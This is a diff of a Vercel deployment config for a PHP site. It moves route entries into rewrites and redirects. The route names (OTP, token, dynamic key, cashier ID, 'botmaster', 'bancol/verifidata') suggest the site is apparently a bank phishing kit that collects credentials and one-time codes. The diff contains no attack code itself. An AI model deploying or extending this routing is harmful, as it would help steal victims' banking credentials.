@@ -9,67 +9,65 @@
       "runtime": "vercel-php@0.9.0"
     }
   },
-  "routes": [
+  "redirects": [
     {
-      "src": "/api/vuelos/",
-      "dest": "/api/vuelos/index.php"
+      "source": "/php_sources/(.*)",
+      "destination": "/",
+      "permanent": false
+    }
+  ],
+  "rewrites": [
+    {
+      "source": "/api/vuelos/",
+      "destination": "/api/vuelos/index.php"
     },
     {
-      "src": "/load.php",
-      "dest": "/api/index.php"
+      "source": "/load.php",
+      "destination": "/api/index.php"
     },
     {
-      "src": "/datos.php",
-      "dest": "/api/index.php"
+      "source": "/datos.php",
+      "destination": "/api/index.php"
     },
     {
-      "src": "/loadtiketid.php",
-      "dest": "/api/index.php"
+      "source": "/loadtiketid.php",
+      "destination": "/api/index.php"
     },
     {
-      "src": "/checking.php",
-      "dest": "/api/index.php"
+      "source": "/checking.php",
+      "destination": "/api/index.php"
     },
     {
-      "src": "/dinadatos/cargando.php",
-      "dest": "/api/index.php"
+      "source": "/dinadatos/cargando.php",
+      "destination": "/api/index.php"
     },
     {
-      "src": "/dinadatos/botmaster2.php",
-      "dest": "/api/index.php"
+      "source": "/dinadatos/botmaster2.php",
+      "destination": "/api/index.php"
     },
     {
-      "src": "/dinadatos/ccajero-id.php",
-      "dest": "/api/index.php"
+      "source": "/dinadatos/ccajero-id.php",
+      "destination": "/api/index.php"
     },
     {
-      "src": "/dinadatos/dinamica-id.php",
-      "dest": "/api/index.php"
+      "source": "/dinadatos/dinamica-id.php",
+      "destination": "/api/index.php"
     },
     {
-      "src": "/dinadatos/error-id.php",
-      "dest": "/api/index.php"
+      "source": "/dinadatos/error-id.php",
+      "destination": "/api/index.php"
     },
     {
-      "src": "/dinadatos/otp-id.php",
-      "dest": "/api/index.php"
+      "source": "/dinadatos/otp-id.php",
+      "destination": "/api/index.php"
     },
     {
-      "src": "/dinadatos/token-id.php",
-      "dest": "/api/index.php"
+      "source": "/dinadatos/token-id.php",
+      "destination": "/api/index.php"
     },
     {
-      "src": "/dinadatos/bancol/verifidata.php",
-      "dest": "/api/index.php"
-    },
-    {
-      "src": "/php_sources/(.*)",
-      "status": 403,
-      "dest": "/"
-    },
-    {
-      "src": "/(.*)",
-      "dest": "/$1"
+      "source": "/dinadatos/bancol/verifidata.php",
+      "destination": "/api/index.php"
     }
   ]
 }
